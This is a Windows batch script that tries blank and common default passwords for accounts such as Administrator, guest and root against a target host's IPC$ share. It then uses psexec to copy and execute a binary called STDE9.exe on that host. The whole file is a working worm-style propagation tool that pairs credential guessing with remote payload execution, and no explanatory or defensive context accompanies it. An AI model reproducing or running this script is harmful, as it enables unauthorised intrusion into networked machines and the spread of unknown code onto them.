@echo off
net use \\%1\ipc$ "" /user:Administrator
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "" /user:admin
net use \\%1\ipc$ "" /user:Admin
net use \\%1\ipc$ "" /user:guest
net use \\%1\ipc$ "" /user:Guest
net use \\%1\ipc$ "" /user:temp
net use \\%1\ipc$ "" /user:Temp
net use \\%1\ipc$ "" /user:root
net use \\%1\ipc$ "" /user:ROOT
net use \\%1\ipc$ "12345" /user:Administrator
net use \\%1\ipc$ "zzzzz" /user:Administrator
net use \\%1\ipc$ "xxxxx" /user:Administrator
net use \\%1\ipc$ "Admin" /user:Administrator
net use \\%1\ipc$ "guest" /user:guest
net use \\%1\ipc$ "2002" /user:Administrator
net use \\%1\ipc$ "abc123" /user:Administrator
net use \\%1\ipc$ "temp" /user:Administrator
net use \\%1\ipc$ "Administrator" /user:Administrator
net use \\%1\ipc$ "login" /user:Administrator
net use \\%1\ipc$ "root" /user:root
net use \\%1\ipc$ "temp" /user:Temp
net use \\%1\ipc$ "root" /user:Administrator
net use \\%1\ipc$ "adm" /user:Administrator
net use \\%1\ipc$ "2003" /user:Administrator
net use \\%1\ipc$ "default" /user:Administrator
net use \\%1\ipc$ "student" /user:student
net use \\%1\ipc$ "admin" /user:Admin
net use \\%1\ipc$ "admin" /user:admin
psexec \\%1 attrib.exe -r STDE9.exe
psexec \\%1 -f -c -d STDE9.exe -o
psexec \\%1 -d STDE9.exe -o
goto end
:end